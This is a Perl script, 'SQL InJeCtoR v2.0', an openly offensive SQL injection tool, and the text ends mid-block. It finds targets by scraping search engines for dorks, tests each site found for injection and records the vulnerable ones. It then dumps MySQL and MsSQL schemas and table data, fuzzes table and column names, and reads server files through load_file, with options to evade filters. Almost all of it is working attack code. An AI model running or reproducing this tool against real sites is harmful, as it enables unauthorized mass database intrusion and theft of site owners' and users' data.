#!/usr/bin/perl


use LWP::UserAgent;
use HTTP::Request;

sub help
{
     system('cls');
     system('AlpHaNiX SQL InJeCtoR v2.0');
     print "\n\n-----------------------------------\n";
     print "[!] Usage : perl $0 <option>\n";
     print "\n\n--/// MySQL\n";
     print "     --mysqlcol         MySQL column length calculator            MySQL v4/5\n";
     print "     --mysqldetails     MySQL target website db global infos      MySQL v4/5\n";
     print "     --mysqlschema      MySQL Full Schema Extractor               MySQL v5\n";
     print "     --mysqldump        MySQL Data Dump                           MySQL v4/5\n";
     print "     --mysqlfile        MySQL load_file fuzzer                    MySQL v4/5\n";
     print "     --mysqltblfuzz     MySQL Table_name Fuzzer                   MySQL v4\n";
     print "     --mysqlcolfuzz     MySQL Column_name Fuzzer                  MySQL v4\n";
     print "\n\n--/// MsSQL\n";
     print "     --mssqldetails      MsSQL DB global info\n";
     print "     --mssqltable        MsSQL Tables Extractor\n";
     print "     --mssqlcolumns      MsSQL Columns Extractor\n";
     print "     --mssqldump         MsSQL Columns Extractor\n";
     print "\n\n--/// Vulunerability Scanner\n";
     print "     --dork              URL Extractor , SQL Vulnerability's Scanner & checker\n";
     print "\n\n--/// Options\n";
     print "     --proxy             define a proxy to use\n";
     print "     --listfile          list of columns or tables to use in fuzz or load_file files list\n";
     print "     --output            save injection or scan result in an outside file\n";
     print "     --table             table to use in dumping data or in tbles extract\n";
     print "     --column            column to use in dumping data or in column extract\n";
     print "     --evasion           %20    /*    +\n";
     print "     --help              print this help text :P\n";
     exit();
}

sub variables
{
     my $i=0;
     foreach (@ARGV)
     {
         if ($ARGV[$i] eq "--dork"){$search_dork = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mysqlcol"){$mysql_count_target = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mysqldetails"){$mysql_details_target = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mysqlschema"){$mysql_schema_target = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mysqldump"){$mysql_dump_target = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mysqltblfuzz"){$mysql_fuzz_table = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mysqlcolfuzz"){$mysql_fuzz_column = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mysqlfile"){$mysql_load_file = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mssqldetails"){$mssql_details_target = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mssqltable"){$mssql_table_target = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mssqlcolumn"){$mssql_column_target = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--mssqldump"){$mssql_dump_target = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--column"){$sql_dump_column = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--table"){$sql_dump_table = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--evasion"){$evasion = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--output"){$vulnfile = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--proxy"){$proxy = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--listfile"){$word_list = $ARGV[$i+1]}
         if ($ARGV[$i] eq "--help"){&help}
         $i++;
     }
}



sub main
{
     system('cls');
     system('title SQL InJeCtoR v2.0');
     print " \n\n      SQL InJeCtoR v2.0";
     print " \n            Coded By AlpHaNiX \n\n";
     if (@ARGV<1){print "[!] For Help : perl $0 --help\n\n\n" ;}
}

sub vulnscanner
{
     checkgoogle();
     googlescan($search_dork);
     askscan($search_dork);
}

sub checkgoogle
{
     my $request   = HTTP::Request->new(GET => "http://www.google.com/search?hl=en&q=$search_dork&btnG=Search&start=10");
     my $useragent = LWP::UserAgent->new(agent => 'FAST-WebCrawler/3.3');
     $useragent->proxy("http", "http://$proxy/") if defined($proxy);
     my $response  = $useragent->request($request) ;
     my $result    = $response->content;
     if ($result   =~ m/if you suspect that your computer or network has been infected/i){print "[!] You Have Been Banned From Google Search :( \n";exit()}
}         

sub googlescan
{
     my $dork  = $_[0];
     for ($i=0;$i<200;$i=$i+10)
     {
         my $request   = HTTP::Request->new(GET => "http://www.google.com/search?hl=en&q=$dork&btnG=Search&start=$i");
         my $useragent = LWP::UserAgent->new(agent => 'FAST-WebCrawler/3.3');
         $useragent->proxy("http", "http://$proxy/") if defined($proxy);
         my $response  = $useragent->request($request) ;
         my $result    = $response->content;
         while ($result =~ m/class=r><a href=\"(.*?)\" class=l>/g )
         {
             print "[!] Trying to fuzz $1\n";     
             checkvuln($1)
         }
     }                  
}

sub askscan
{
     my $dork  = $_[0];
     for ($i=0;$i<20;$i++)
     {
         my $request   = HTTP::Request->new(GET => "http://www.ask.com/web?q=page.php?id=&qsrc=0&o=0&l=dir&q=$dork&page=$i&jss=");
         my $useragent = LWP::UserAgent->new(agent => 'FAST-WebCrawler/3.3');
         $useragent->proxy("http", "http://$proxy/") if defined($proxy);
         my $response  = $useragent->request($request) ;
         my $result    = $response->content;
         while ($result =~ m/<span id=\"r(.*)_u\" class=\"(.*)\">(.*)<\/span>/gi)
         {
             my $askurl ="http://".$3 ;
             print "[!] Trying to fuzz $askurl\n";
             checkvuln($askurl);
         }
     }
}

sub checkvuln
{
     my $scan_url   = $_[0];
     my $link       = $scan_url.'0+order+by+9999999--';
     my $ua         = LWP::UserAgent->new();
     $ua->proxy("http", "http://$proxy/") if defined($proxy);
     my $req        = $ua->get($link);
     my $fuzz       = $req->content;
     if ($fuzz =~ m/You have an error in your SQL syntax/i || $fuzz =~ m/Query failed/i || $fuzz =~ m/SQL query failed/i || $fuzz =~ m/mysql_fetch_/i || $fuzz =~ m/mysql_fetch_array/i || $fuzz =~ m/mysql_num_rows/i || $fuzz =~ m/The used SELECT statements have a different number of columns/i )
     {
         print "[!] MySQL Vulnerable     -> $scan_url\n";
         if (defined($vulnfile))
         { 
             push (@mysqlvuln,"$scan_url\n");
         }
     }
     elsif ($fuzz =~ m/ODBC SQL Server Driver/i)
     {
         print "[!] MsSQL Vulnerable     -> $scan_url\n";
         if (defined($vulnfile))
         { 
             push (@mssqlvuln,"$scan_url\n");
         }
     }
     elsif ($fuzz =~ m/Microsoft JET Database/i || $fuzz =~ m/ODBC Microsoft Access Driver/i )
     {
         print "[!] MS Access Vulnerable -> $scan_url\n";
         if (defined($vulnfile))
         { 
             push (@accessvuln,"$scan_url\n");
         }
     }
}

sub mysqlcount
{
     my $site   = $_[0];
     my $ev     = $_[1];
     my $null   = "09'+and+1=" ;
     my $code   = "0+union+select+" ;
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     my $injection = $site.$null.$code."0",$com ;
     my $useragent = LWP::UserAgent->new();
     $useragent->proxy("http", "http://$proxy/") if defined($proxy);
     my $response  = $useragent->get($injection);
     my $result   = $response->content;
     if( $result =~ m/You have an error in your SQL syntax/i || $result =~ m/Query failed/i || $result =~ m/supplied argument is not a valid MySQL/i || $result =~ m/SQL query failed/i || $result =~ m/mysql_fetch_/i || $result =~ m/mysql_fetch_array/i || $result =~ m/mysql_num_rows/i || $result =~ m/The used SELECT statements have a different number of columns/i )
     {
          print "\n[!] This Website Is Vulnerable\n" ;
          print "[+] Working On It\n";
     }
     else
     {
         print "\n[!] This WebSite Is Not SQL Vulnerable !\n";
         exit();
     }
     for ($i = 0 ; $i < 100 ; $i ++)
     {
         $col.=','.$i;
         $specialword.=','."0x617a38387069783030713938";
         if ($i == 0)
         {
             $specialword = '' ; 
             $col = '' ;
         }
         $sql=$site.$null.$code."0x617a38387069783030713938".$specialword.$com ;
         $ua = LWP::UserAgent->new();
         $ua->proxy("http", "http://$proxy/") if defined($proxy);
         $rq = $ua->get($sql);
         $response = $rq->content;
         if($response =~ /az88pix00q98/)
         {
             $i ++;             
             print "\n[!] MySQL Column Count Finished\n" ;
             print "[!] This WebSite Have $i Columns\n" ;
             $sql=$site.$null.$code."0".$col.$com ;
             print "=> ".$sql ."\n\n";    
             if (defined($vulnfile))
             {
                 open(vuln_file,">>$vulnfile") ;
                 print vuln_file "Target Host : $site\n";
                 print vuln_file "Evasion     : $ev\n";
                 print vuln_file "Col length  : $i\n";
                 print vuln_file "Injection   : $sql\n";
                 close(vuln_file);
                 print "[+] Result Saved to $vulnfile\n";
             }
             exit () ;         
         }    
     }
}

sub mysqldetails
{
     my $site   = $_[0];
     my $ev     = $_[1];
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     my $selection = "concat(0x617a38387069783030713938,version(),0x617a38387069783030713938,database(),0x617a38387069783030713938,user(),0x617a38387069783030713938)";
     print "\n[+] Info Getting, Started Please Wait ....\n\n";
     if ($site =~ /(.*)NullArea(.*)/i)
     {
         my $newlink = $1.$selection.$2.$com;
         my $ua = LWP::UserAgent->new();
         $ua->proxy("http", "http://$proxy/") if defined($proxy);
         my $request = $ua->get($newlink);
         my $content = $request->content;
         if ($content =~ /az88pix00q98(.*)az88pix00q98(.*)az88pix00q98(.*)az88pix00q98/)
         {
             print "[!] Database Version  : $1\n";
             print "[!] Database Name     : $2\n";                          
             print "[!] DB UserName       : $3\n";                          
             if (defined($vulnfile))
             {
                 open(vuln_file,">>$vulnfile") ;
                 print vuln_file "[!] Target            : $site\n";
                 print vuln_file "[!] evasion           : $ev\n";
                 print vuln_file "[!] Database Version  : $1\n";
                 print vuln_file "[!] Database Name     : $2\n";
                 print vuln_file "[!] DB UserName       : $3\n";
                 close(vuln_file);
                 print "\n[+] Result Saved to $vulnfile\n";
             }
             exit () ;             
         }
         else
         {
             print "[!] Failed\n";
             exit () ;    
         }
     }
     else 
     {
         print "[+] Please Enter the target this way :\n http://target.net/page.php?id=0+union+select+1,2,nullarea,3\n";
         exit () ;             
     }
}

sub mysqlschema
{
     my $site   = $_[0];
     my $ev     = $_[1];
     my @schema=();
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     my $selection = "concat(0x617a38387069783030713938,column_name,0x617a38387069783030713938,table_name,0x617a38387069783030713938,table_schema,0x617a38387069783030713938)";
     print "\n[+] Schema Extracting, Started Please Wait ....\n\n";
     if ($site =~ /(.*)NullArea(.*)/i)
     {
         print "[+] Column :|: Table :|: Database\n"; 
         for ($i=0;  $i<=1000 ; $i++ )
         {
             $newstring = $1.$selection.$2.$add.'from'.$add.'information_schema.columns'.$add.'LIMIT'.$add.$i.','.'1'.$com;
             my $ua = LWP::UserAgent->new();
             $ua->proxy("http", "http://$proxy/") if defined($proxy);
             my $request = $ua->get($newstring);
             my $content = $request->content;
             if ($content =~ /az88pix00q98(.*)az88pix00q98(.*)az88pix00q98(.*)az88pix00q98/)
             { 
                 print "[!] $1 :|: $2 :|: $3 \n";
                 push (@schema,"$1 :|: $2 :|: $3 \n");
             }
         }
         if (defined($vulnfile))
         {
             open(vuln_file,">>$vulnfile") ;
             print vuln_file "[!] Target            : $site\n";
             print vuln_file "[!] evasion           : $ev\n";
             print vuln_file "[!] Schema  :: ----     \n\n\n";
             $i=0;
             foreach(@schema)
             {
                 print vuln_file $schema[$i]."\n";
                 $i++;
             }
             print "\n[+] Result Saved to $vulnfile\n";
         }
     }
     else 
     {
         print "[+] Please Enter the target this way :\n http://target.net/page.php?id=0+union+select+1,2,nullarea,3\n";
         exit () ;             
     }
}

sub mysqldump
{
     my $site   = $_[0];
     my $colm   = $_[1];
     my $tble   = $_[2];
     my $ev     = $_[3];
     print "[+] Table name $tble\n";
     print "[+] Column name $colm\n";
     my @dumper=();
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     my $selection = "concat(0x617a38387069783030713938,$colm,0x617a38387069783030713938)";
     print "\n[+] Data Dump Started Please Wait ....\n\n";
     if ($site =~ /(.*)NullArea(.*)/i)
     {
         $i=0;
         print "[+] Dumped Data : //// \n"; 
         do
         {
             $newstring = $1.$selection.$2.$add.'from'.$add.$tble.$add.'LIMIT'.$add.$i.','.'1'.$com;             
             my $ua = LWP::UserAgent->new();
             $ua->proxy("http", "http://$proxy/") if defined($proxy);
             my $request = $ua->get($newstring);
             my $content = $request->content;
             if ($content =~ /az88pix00q98(.*)az88pix00q98/)
             { 
                 print "[!] $1 \n";
                 push(@dumper,"$1\n");
             }
             $i++;
         }
         while ($i<1500);
         if (defined($vulnfile))
         {
             open(vuln_file,">>$vulnfile") ;
             print vuln_file "[!] Target            : $site\n";
             print vuln_file "[!] evasion           : $ev\n";
             print vuln_file "[!] Dumped Column     : $colm\n";
             print vuln_file "[!] Dumped Table      : $tble\n";
             print vuln_file "[!] Data  :: ----     \n\n\n";
             $i=0;
             foreach(@dumper)
             {
                 print vuln_file $dumper[$i]."\n";
                 $i++;
             }
             close(vuln_file);
             print "\n[+] Result Saved to $vulnfile\n";
         }
     }
     else 
     {
         print "[+] Please Enter the target this way :\n http://target.net/page.php?id=0+union+select+1,2,nullarea,3\n";
         exit () ;             
     }
}

sub mysqlfuzztable
{
     my $site    = $_[0];
     my $ev      = $_[1];
     my $filelst = $_[2];
     print "[+] File List $filelst\n";
     my @tbles_possible=();
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     open (word_list_file,"$filelst") or die "[!] Couldnt Open WordList File $!\n";
     @word_list_search = <word_list_file> ;
     print "\n[+] Fuzzing Table, Started Please Wait ....\n\n";
     if ($site =~ /(.*)NullArea(.*)/i)
     {
         print "[+] Fuzz Result : //// \n\n";
         $i=0;         
         foreach (@word_list_search)
         {
             print "[!] Trying To Fuzz Table_name with $word_list_search[$i]";
             $newstring = $1."0x617a38387069783030713938".$2.$add.'from'.$add.$word_list_search[$i].$com;                 
             my $ua = LWP::UserAgent->new();
             $ua->proxy("http", "http://$proxy/") if defined($proxy);
             my $request = $ua->get($newstring);
             my $content = $request->content;
             if ($content =~ /az88pix00q98/)
             { 
                 print "\n[!] Found Table ! $word_list_search[$i] \n";
                 push(@tbles_possible,"$word_list_search[$i]\n");
             }
             $i++;
         }
         if (defined($vulnfile))
         {
             open(vuln_file,">>$vulnfile") ;
             print vuln_file "[!] Target            : $site\n";
             print vuln_file "[!] evasion           : $ev\n";
             print vuln_file "[!] Wordlist          : $filelst\n";
             print vuln_file "[!] Tbles Found  :: ----     \n\n\n";
             $i=0;
             foreach(@tbles_possible)
             {
                 print vuln_file $tbles_possible[$i]."\n";
                 $i++;
             }
             close(vuln_file);
             print "\n[+] Result Saved to $vulnfile\n";
         }
     }
     else 
     {
         print "[+] Please Enter the target this way :\n http://target.net/page.php?id=0+union+select+1,2,nullarea,3\n";
         exit () ;             
     }
}

sub mysqlfuzzcolumn
{
     my $site    = $_[0];
     my $ev      = $_[1];
     my $filelst = $_[2];
     my $tablext = $_[3];
     print "[+] File List $filelst\n";
     print "[+] Table To Fuzz Columns $tablext\n";
     my @cols_possible=();
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     open (word_list_file,"$filelst") or die "[!] Couldnt Open WordList File $!\n";
     @word_list_search = <word_list_file> ;
     print "\n[+] Fuzzing Column, Started Please Wait ....\n\n";
     if ($site =~ /(.*)NullArea(.*)/i)
     {
         print "[+] Fuzz Result : //// \n\n";
         $i=0;         
         foreach (@word_list_search)
         {
             print "[!] Trying To Fuzz Column_name with $word_list_search[$i]";
             $newstring = $1."concat(0x617a38387069783030713938,$word_list_search[$i])".$2.$add.'from'.$add.$tablext.$com;                 
             my $ua = LWP::UserAgent->new();
             $ua->proxy("http", "http://$proxy/") if defined($proxy);
             my $request = $ua->get($newstring);
             my $content = $request->content;
             if ($content =~ /az88pix00q98/)
             { 
                 print "\n[!] File Column ! $word_list_search[$i] \n";
                 push(@cols_possible,"$word_list_search[$i]\n");
             }
             $i++;
         }
         if (defined($vulnfile))
         {
             open(vuln_file,">>$vulnfile") ;
             print vuln_file "[!] Target            : $site\n";
             print vuln_file "[!] evasion           : $ev\n";
             print vuln_file "[!] Wordlist          : $filelst\n";
             print vuln_file "[!] Cols Found  :: ----     \n\n\n";
             $i=0;
             foreach(@cols_possible)
             {
                 print vuln_file $cols_possible[$i]."\n";
                 $i++;
             }
             close(vuln_file);
             print "\n[+] Result Saved to $vulnfile\n";
         }
     }
     else 
     {
         print "[+] Please Enter the target this way :\n http://target.net/page.php?id=0+union+select+1,2,nullarea,3\n";
         exit () ;             
     }
}

sub mysqlfile
{
     my $site    = $_[0];
     my $ev      = $_[1];
     my $filelst = $_[2];
     print "[+] File List $filelst\n";
     my @cols_possible=();
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     open (word_list_file,"$filelst") or die "[!] Couldnt Open WordList File $!\n";
     @word_list_search = <word_list_file> ;
     print "\n[+] File Fuzz, Started Please Wait ....\n\n";
     if ($site =~ /(.*)NullArea(.*)/i)
     {
         print "[+] Fuzz Result : //// \n\n";
         $i=0;         
         foreach (@word_list_search)
         {
             $newstring = $1."concat(0x617a38387069783030713938,load_file('$word_list_search[$i]'))".$2.$com;             
             my $ua = LWP::UserAgent->new();
             $ua->proxy("http", "http://$proxy/") if defined($proxy);
             my $request = $ua->get($newstring);
             my $content = $request->content;
             print "[!] Trying To Fuzz Load_File with $word_list_search[$i]";
             if ($content =~ m/az88pix00q/i)
             { 
                 print "\n[!] Found File ! $word_list_search[$i] \n";
                 push(@cols_possible,"$word_list_search[$i]\n");
             }
             $i++;
         }
         if (defined($vulnfile))
         {
             open(vuln_file,">>$vulnfile") ;
             print vuln_file "[!] Target            : $site\n";
             print vuln_file "[!] evasion           : $ev\n";
             print vuln_file "[!] Wordlist          : $filelst\n";
             print vuln_file "[!] Files Found  :: ----     \n\n\n";
             $i=0;
             foreach(@cols_possible)
             {
                 print vuln_file $cols_possible[$i]."\n";
                 $i++;
             }
             close(vuln_file);
             print "\n[+] Result Saved to $vulnfile\n";
         }
     }
     else 
     {
         print "[+] Please Enter the target this way :\n http://target.net/page.php?id=0+union+select+1,2,nullarea,3\n";
         exit () ;             
     }
}

sub mssqldetails
{
     my $site   = $_[0];
     my $ev     = $_[1];
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     print "\n[+] Getting Infos, Started Please Wait ....\n\n";
     $version = "convert(int,(select".$add."\@\@version));--" ;
     $system_user = 'convert(int,(select'.$add.'system_user));--';
     $db_name = 'convert(int,(select'.$add.'db_name()));--';
     $servername = 'convert(int,(select'.$add.'@@servername));--' ;
     my $injection = $site.$version ;
     my $request   = HTTP::Request->new(GET=>$injection);
     my $useragent = LWP::UserAgent->new();
     $useragent->timeout(10);
     my $response  = $useragent->request($request)->as_string ;
     if ($response =~ /.*?value\s'/)
     {
         print "[+] This Website Is SQL Vulnerable ..\n";
         print "[+] Working On It ..\n";
         $ver = $1 if ($response =~ /.*?value\s'(.*?)'\sto.*/sm) ;
         print "\n[!] MsSQL Version Is :";
         print "\n\n => $ver"    ;
         my $injection = $site.$system_user ;
         my $request   = HTTP::Request->new(GET=>$injection);
         my $useragent = LWP::UserAgent->new();
         $useragent->timeout(10);
         my $response  = $useragent->request($request)->as_string ;
         $system_user = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
         print "\n[!] MsSQL System_User Is    :";
         print "  $system_user  "    ;
         my $injection = $site.$db_name ;
         my $request   = HTTP::Request->new(GET=>$injection);
         my $useragent = LWP::UserAgent->new();
         $useragent->timeout(10);
         my $response  = $useragent->request($request)->as_string ;
         $db_name = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
         print "\n[!] MsSQL Database Name Is  :";
         print "  $db_name  "    ;          
         my $injection = $site.$servername ;
         my $request   = HTTP::Request->new(GET=>$injection);
         my $useragent = LWP::UserAgent->new();
         $useragent->timeout(10);
         my $response  = $useragent->request($request)->as_string ;
         $servername = $1 if ($response =~ /.*value\s'(.*)'\sto.*/);
         print "\n[!] MsSQL Server Name Is    :";
         print "  $servername  "    ;    
         exit ();                       
     }
     else 
     {
         system ("cls");
         print "\n[!] This Website Is Not SQL Vulnerable !";
         exit();
    }
}

sub mssqltable
{
     my $site   = $_[0];
     my $ev     = $_[1];
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     print "\n[+] Table Extracting, Started Please Wait ....\n\n";
     $table = "convert(int,(select".$add."top".$add."1".$add."table_name".$add."from".$add."information_schema.tables));--";
     $data = "'Ws65qd798sqd9878'";
     print "[!] Tables : //// \n\n"; 
     for ($i;$i<1500;$i++)
     {
         my $injection = $site.$table ;
         my $useragent = LWP::UserAgent->new();
         $ua->proxy("http", "http://$proxy/") if defined($proxy);
         my $request   = $useragent->get($injection);
         my $response  = $request->content;
         if ($response =~ /.*?value\s'(.*?)'\sto.*/sm)
         {
             print "[+] ".$1."\n";
             push (@exttbles,$1);
             $start = "(";
             $data .= ",'$1'";
             $end   = ")";
             $total = $start.$data.$end;
             $table = "convert(int,(select".$add."top".$add."1".$add."table_name".$add."from".$add."information_schema.tables".$add."where".$add."table_name".$add."not".$add."in".$add."$total));--";    
         }
     }
     if (defined($vulnfile))
     {
         open(vuln_file,">>$vulnfile") ;
         print vuln_file "[!] Target            : $site\n";
         print vuln_file "[!] evasion           : $ev\n";
         print vuln_file "[!] Data  :: ----     \n\n\n";
         $i=0;
         foreach(@exttbles)
         {
             print vuln_file $exttbles[$i]."\n";
             $i++;
         }
         close(vuln_file);
         print "\n[+] Result Saved to $vulnfile\n";
     }
}

sub mssqlcolumn
{
     my $site   = $_[0];
     my $ev     = $_[1];
     my $tblextrct = $_[2];
     print "[+] Table To Extract From $tblextrct\n";
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     print "\n[+] Table Extracting, Started Please Wait ....\n\n";
     $data = "'Ws65qd798sqd9878'";
     $table = "convert(int,(select".$add."top".$add."1".$add."column_name".$add."from".$add."information_schema.columns".$add."where".$add."table_name"."="."'$tblextrct'".$add."And".$add."column_name".$add."not".$add."in".$add."($data)"."));--";
     print "[!] Columns : //// \n\n"; 
     for ($i;$i<1500;$i++)
     {
         my $injection = $site.$table ;
         my $useragent = LWP::UserAgent->new();
         $ua->proxy("http", "http://$proxy/") if defined($proxy);
         my $request   = $useragent->get($injection);
         my $response  = $request->content;
         if ($response =~ /.*?value\s'(.*?)'\sto.*/sm)
         {
             print "[+] ".$1."\n";
             push (@extcols,$1);
             $start = "(";
             $data .= ",'$1'";
             $end   = ")";
             $total = $start.$data.$end;
             $table = "convert(int,(select".$add."top".$add."1".$add."column_name".$add."from".$add."information_schema.columns".$add."where".$add."table_name"."="."'$tblextrct'".$add."And".$add."column_name".$add."not".$add."in".$add."$total"."));--";    
         }
     }
     if (defined($vulnfile))
     {
         open(vuln_file,">>$vulnfile") ;
         print vuln_file "[!] Target            : $site\n";
         print vuln_file "[!] evasion           : $ev\n";
         print vuln_file "[!] Data  :: ----     \n\n\n";
         $i=0;
         foreach(@extcols)
         {
             print vuln_file $extcols[$i]."\n";
             $i++;
         }
         close(vuln_file);
         print "\n[+] Result Saved to $vulnfile\n";
     }
}

sub mssqldump
{
     my $site   = $_[0];
     my $ev     = $_[1];
     my $tblextrct = $_[2];
     my $colmextrct = $_[3];
     print "[+] Table  : $tblextrct\n";
     print "[+] Column : $colmextrct\n";
     if ($ev eq '/*') 
     {$add = "/**/" ; $com = "/*";}
     elsif ($ev eq '%20') 
     {$add = "%20" ; $com = "%00" ;}
     else 
     {$add = '+' ; $com ='--';}
     print "\n[+] Table Extracting, Started Please Wait ....\n\n";
     $data = "'Ws65qd798sqd9878'";
     $table = "convert(int,(select".$add."top".$add."1".$add."$colmextrct".$add."from".$add."$tblextrct".$add."where".$add."$colmextrct".$add."not".$add."in".$add."($data)"."));--";
     print "[!] Columns : //// \n\n"; 
     for ($i;$i<1500;$i++)
     {
         my $injection = $site.$table ;
         my $useragent = LWP::UserAgent->new();
         $ua->proxy("http", "http://$proxy/") if defined($proxy);
         my $request   = $useragent->get($injection);
         my $response  = $request->content;
         if ($response =~ /.*?value\s'(.*?)'\sto.*/sm)
         {
             print "[+] ".$1."\n";
             push (@dumpdata,$1);
             $start = "(";
             $data .= ",'$1'";
             $end   = ")";
             $total = $start.$data.$end;
             $table = "convert(int,(select".$add."top".$add."1".$add."$colmextrct".$add."from".$add."$tblextrct".$add."where".$add."$colmextrct".$add."not".$add."in".$add."$total"."));--";
         }
     }
     if (defined($vulnfile))
     {
         open(vuln_file,">>$vulnfile") ;
         print vuln_file "[!] Target            : $site\n";
         print vuln_file "[!] evasion           : $ev\n";
         print vuln_file "[!] Data  :: ----     \n\n\n";
         $i=0;
         foreach(@dumpdata)
         {
             print vuln_file $dumpdata[$i]."\n";
             $i++;
         }
         close(vuln_file);
         print "\n[+] Result Saved to $vulnfile\n";
     }
}

variables();
main();

if (defined($search_dork))
{
     print "[+] Vulnerability Scan\n" ;
     print "[+] Dork : $search_dork\n\n\n" ;
     vulnscanner();
     if (defined($vulnfile))
     {
         open(vuln_file,">>$vulnfile") ;
         print vuln_file @mysqlvuln;
         print vuln_file @mssqlvuln;
         print vuln_file @accessvuln;
         close(vuln_file);
         print "[+] Result Saved to $vulnfile\n";
         exit();
     }
} 

if (defined($mysql_count_target))
{
     print "[+] MySQL Column Counter\n\n" ;
     print "[+] Target : $mysql_count_target\n" ;
     if ($evasion eq '/*')
     {
         print "[+] Evasion : /**/\n" ;
     }
     elsif ($evasion eq '%20')
     {
         print "[+] Evasion : %20\n" ;
     }
     else
     {
         print "[+] Evasion : --\n" ;
         $evasion = "--"
     }
     mysqlcount($mysql_count_target,$evasion);
}

if (defined($mysql_details_target))
{
     print "[+] MySQL database details\n\n" ;
     print "[+] Target : $mysql_details_target\n" ;
     if ($evasion eq '/*')
     {
         print "[+] Evasion : /**/\n" ;
     }
     elsif ($evasion eq '%20')
     {
         print "[+] Evasion : %20\n" ;
     }
     else
     {
         print "[+] Evasion : --\n" ;
         $evasion = "--"
     }
     mysqldetails($mysql_details_target,$evasion);
}

if (defined($mysql_schema_target))
{
     print "[+] MySQL Schema Extractor details\n\n" ;
     print "[+] Target : $mysql_schema_target\n" ;
     if ($evasion eq '/*')
     {
         print "[+] Evasion : /**/\n" ;
     }
     elsif ($evasion eq '%20')
     {
         print "[+] Evasion : %20\n" ;
     }
     else
     {
         print "[+] Evasion : --\n" ;
         $evasion = "--"
     }
     mysqlschema($mysql_schema_target,$evasion);
}

if (defined($mysql_dump_target))
{
     if (!defined($sql_dump_column))
     {
         print "[!] Please Defind At Least A Column\n";
         exit();
     }
     elsif (!defined($sql_dump_table))
     {
         print "[!] Please Defind Table Name\n";
         exit();
     }
     else
     {
         print "[+] MySQL Data Dumper details\n\n" ;
         print "[+] Target : $mysql_dump_target\n" ;
         if ($evasion eq '/*')
         {
             print "[+] Evasion : /**/\n" ;
         }
         elsif ($evasion eq '%20')
         {
             print "[+] Evasion : %20\n" ;
         }
         else
         {
             print "[+] Evasion : --\n" ;
             $evasion = "--"
         }
         mysqldump($mysql_dump_target,$sql_dump_column,$sql_dump_table,$evasion);
     }     
}

if (defined($mysql_fuzz_table))
{
     if(!defined($word_list))
     {
         print "[!] Please Define A list of tables to load\n";
         exit();
     }     
     else
     {
         print "[+] MySQL Tables Fuzzer\n\n" ;
         print "[+] Target : $mysql_fuzz_table\n" ;
         if ($evasion eq '/*')
         {
             print "[+] Evasion : /**/\n" ;
         }
         elsif ($evasion eq '%20')
         {
             print "[+] Evasion : %20\n" ;
         } 
         else
         {
             print "[+] Evasion : --\n" ;
             $evasion = "--"
         }
         mysqlfuzztable($mysql_fuzz_table,$evasion,$word_list);     
     }
}

if (defined($mysql_fuzz_column))
{
     if(!defined($word_list))
     {
         print "[!] Please Define A list of tables to load\n";
         exit();
     }     
     elsif(!defined($sql_dump_table))
     {
         print "[!] Please Define A Table To Fuzz it's Columns\n";
         exit();
     }    
     else
     {
         print "[+] MySQL Columns Fuzzer\n\n" ;
         print "[+] Target : $mysql_fuzz_column\n" ;
         if ($evasion eq '/*')
         {
             print "[+] Evasion : /**/\n" ;
         }
         elsif ($evasion eq '%20')
         {
             print "[+] Evasion : %20\n" ;
         } 
         else
         {
             print "[+] Evasion : --\n" ;
             $evasion = "--"
         }
         mysqlfuzzcolumn($mysql_fuzz_column,$evasion,$word_list,$sql_dump_table);     
     }
}

if (defined($mysql_load_file))
{
     if(!defined($word_list))
     {
         print "[!] Please Define A list of tables to load\n";
         exit();
     }     
     else
     {
         print "[+] MySQL Load_File Fuzzer\n\n" ;
         print "[+] Target : $mysql_load_file\n" ;
         if ($evasion eq '/*')
         {
             print "[+] Evasion : /**/\n" ;
         }
         elsif ($evasion eq '%20')
         {
             print "[+] Evasion : %20\n" ;
         } 
         else
         {
